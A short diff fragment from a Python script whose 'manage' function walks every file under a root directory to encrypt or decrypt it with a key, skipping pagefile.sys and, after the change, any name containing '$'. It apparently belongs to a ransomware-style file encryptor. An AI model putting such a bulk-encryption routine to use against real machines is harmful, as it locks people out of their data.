@@ -83,7 +83,7 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
     
     for subdir, dirs, files in os.walk(rootDirectionary):
         for file in files:
-            if file != "pagefile.sys" and not file.startswith("$"):
+            if file != "pagefile.sys" and not "$" in file:
                 filename = os.path.join(subdir, file)
                 print(filename)
                 if function == 0:    
